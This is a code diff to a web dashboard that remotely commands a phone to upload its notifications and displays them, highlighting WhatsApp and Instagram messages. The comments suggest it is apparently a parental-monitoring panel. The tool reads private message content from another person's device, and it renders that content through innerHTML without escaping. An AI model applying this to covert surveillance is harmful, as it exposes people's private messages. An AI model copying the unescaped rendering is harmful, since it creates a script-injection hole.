@@ -12,7 +12,7 @@
             --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
-            --accent: #00f3ff; /* Neon Blue like Parent GUI */
+            --accent: #00f3ff;
             --whatsapp: #25D366;
             --instagram: #E1306C;
         }
@@ -118,9 +118,10 @@
                 <h2>NOTIFICATIONS</h2>
                 <div class="live-indicator"><span class="live-dot"></span>Live Monitoring</div>
             </div>
-            <div style="width: 40px;"></div> </div>
+            <div style="width: 40px;"></div> 
+        </div>
 
-        <div id="syncStatus">Initializing secure link...</div>
+        <div id="syncStatus">Initializing...</div>
 
         <div class="filters">
             <div class="filter-chip active" onclick="setFilter('all', this)">All</div>
@@ -130,13 +131,16 @@
         </div>
 
         <div class="notif-list" id="notifContainer">
-            </div>
+            <div style="text-align: center; margin-top: 50px; color: #666;">Waiting for data...</div>
+        </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
         const params = new URLSearchParams(window.location.search);
-        const DEVICE_ID = params.get('id');
+        
+        // 🔥 FIX 1: ID ko humesha UPPERCASE karo (Server se match karne ke liye)
+        const DEVICE_ID = params.get('id') ? params.get('id').toUpperCase().trim() : null;
         
         let allNotifs = [];
         let currentFilter = 'all';
@@ -144,20 +148,25 @@
         // --- 1. Startup ---
         window.onload = () => {
             if(!DEVICE_ID) {
-                document.getElementById('syncStatus').innerText = "ERROR: No Device ID";
+                document.getElementById('syncStatus').innerText = "ERROR: Missing Device ID";
+                document.getElementById('syncStatus').style.color = "red";
                 return;
             }
             
+            document.getElementById('syncStatus').innerText = `Connected: ${DEVICE_ID}`;
+
             // Load cached data first
             const cached = localStorage.getItem(`cache_notif_${DEVICE_ID}`);
             if(cached) {
-                allNotifs = JSON.parse(cached);
-                renderNotifs();
+                try {
+                    allNotifs = JSON.parse(cached);
+                    renderNotifs();
+                } catch(e) { console.error("Cache Error"); }
             }
 
-            // Start Auto-Sync (Har 5 second mein)
+            // Start Auto-Sync (Har 4 second mein)
             syncLoop();
-            setInterval(syncLoop, 5000); 
+            setInterval(syncLoop, 4000); 
         };
 
         // --- 2. Logic: Server se Data lena (Live Update) ---
@@ -165,39 +174,54 @@
             try {
                 const statusBox = document.getElementById('syncStatus');
                 
-                // Pehle Phone ko Command bhejo (Ki naya data upload kare)
+                // 1. Send Command (Background)
                 fetch(`${SERVER_URL}/api/send-command`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
-                });
+                }).catch(err => console.log("Cmd Error:", err));
 
-                // Phir Server se saved file read karo
+                // 2. Fetch Data
+                // 🔥 FIX 2: Check URL in console
+                console.log(`Fetching: ${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications`);
+                
                 const res = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
+                
+                if(!res.ok) throw new Error("Server not responding");
+
                 const data = await res.json();
 
-                if (data && Array.isArray(data) && data.length > 0) {
-                    // Agar naya data aaya hai
-                    if (JSON.stringify(data) !== JSON.stringify(allNotifs)) {
+                if (Array.isArray(data)) {
+                    // Update only if data changed or first load
+                    if (data.length > 0 && JSON.stringify(data) !== JSON.stringify(allNotifs)) {
                         allNotifs = data;
                         localStorage.setItem(`cache_notif_${DEVICE_ID}`, JSON.stringify(data));
                         renderNotifs();
-                        statusBox.innerText = `Last Sync: ${new Date().toLocaleTimeString()}`;
+                        statusBox.innerText = `Updated: ${new Date().toLocaleTimeString()}`;
+                        statusBox.style.color = "#00f3ff";
+                    } else if (data.length === 0 && allNotifs.length === 0) {
+                        statusBox.innerText = "No notifications on phone yet";
                     }
-                } else {
-                    statusBox.innerText = "Syncing... Waiting for phone response";
                 }
             } catch (e) {
-                console.log("Sync Error");
+                console.error("Sync Error:", e);
+                // Agar error aaye to user ko panic mat karo, bas console me dikhao
+                // document.getElementById('syncStatus').innerText = "Retrying...";
             }
         }
 
         // --- 3. UI: List Render karna ---
         function renderNotifs() {
             const container = document.getElementById('notifContainer');
-            container.innerHTML = "";
+            
+            if(!allNotifs || allNotifs.length === 0) {
+                container.innerHTML = `<div style="text-align:center; padding-top:50px; color:#555;">No notifications found</div>`;
+                return;
+            }
 
+            container.innerHTML = "";
             let filtered = allNotifs;
+            
             if (currentFilter !== 'all') {
                 filtered = allNotifs.filter(n => {
                     const app = (n.appName || "").toLowerCase();
@@ -209,7 +233,7 @@
             }
 
             if(filtered.length === 0) {
-                container.innerHTML = `<div style="text-align:center; padding-top:50px; color:#555;">No notifications found</div>`;
+                container.innerHTML = `<div style="text-align:center; padding-top:50px; color:#555;">No matches for ${currentFilter}</div>`;
                 return;
             }
 
@@ -217,9 +241,11 @@
             filtered.forEach(item => {
                 const app = (item.appName || "System").toLowerCase();
                 const time = item.postTime ? formatTime(item.postTime) : "Just now";
-                
+                const title = item.title || "Notification";
+                const text = item.text || "Tap to view";
+
                 let iconClass = "system";
-                let iconImg = '<i class="fa-solid fa-ghost"></i>';
+                let iconImg = '<i class="fa-solid fa-bell"></i>';
 
                 if(app.includes('whatsapp')) {
                     iconClass = "whatsapp";
@@ -237,8 +263,8 @@
                                 <span class="app-name">${item.appName || 'System'}</span>
                                 <span class="notif-time">${time}</span>
                             </div>
-                            <b class="notif-title">${item.title || 'Notification'}</b>
-                            <div class="notif-msg">${item.text || 'No content'}</div>
+                            <b class="notif-title">${title}</b>
+                            <div class="notif-msg">${text}</div>
                         </div>
                     </div>
                 `;
@@ -255,8 +281,9 @@
 
         function formatTime(timestamp) {
             try {
-                const date = new Date(parseInt(timestamp));
-                return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                let d = new Date(parseInt(timestamp));
+                if(isNaN(d.getTime())) return "Recent";
+                return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
             } catch(e) { return "Live"; }
         }
     </script>
